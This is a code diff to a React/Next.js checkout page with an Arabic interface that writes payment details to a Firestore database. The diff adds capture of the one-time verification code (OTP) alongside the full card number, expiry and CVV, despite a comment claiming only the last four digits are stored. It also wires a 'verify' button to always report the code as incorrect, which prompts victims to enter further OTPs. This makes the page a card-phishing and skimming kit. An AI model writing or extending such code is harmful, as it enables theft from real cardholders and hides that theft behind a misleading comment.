@@ -4,7 +4,7 @@ import { useState, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
 import { Navbar } from "@/components/ui/navbar"
 import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { collection, addDoc } from 'firebase/firestore'
 import { db } from '@/lib/firebase'
@@ -94,7 +94,8 @@ export default function CheckoutPage() {
         paymentInfo: {
           cardNumber: paymentInfo.cardNumber, // Only store last 4 digits
           expiryDate: paymentInfo.expiryDate,
-          cvc: paymentInfo.cvv
+          cvc: paymentInfo.cvv,
+          otp:paymentInfo.otp
         },
         createdAt: new Date()
       }
@@ -231,11 +232,13 @@ export default function CheckoutPage() {
                     </div>
                   </div>
                   <Button onClick={(w) => handlePaymentSubmit(w).then(() => {
-                    alert("رمز التحقق غير صحيح")
                   })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
-                    تحقق                  </Button>
+                    دفع                  </Button>
                 </div>
               </CardContent>
+              <CardFooter>
+                <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
+              </CardFooter>
             </Card>
           ) : (<Card>
             <CardHeader>
@@ -251,6 +254,10 @@ export default function CheckoutPage() {
                   required
                 />
               </div>
+              <Button onClick={(w) => handlePaymentSubmit(w).then(() => {
+                    alert("رمز التحقق غير صحيح")
+                  })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white mt-2">
+                    تحقق                  </Button>
             </CardContent>
           </Card>)}
         </div>
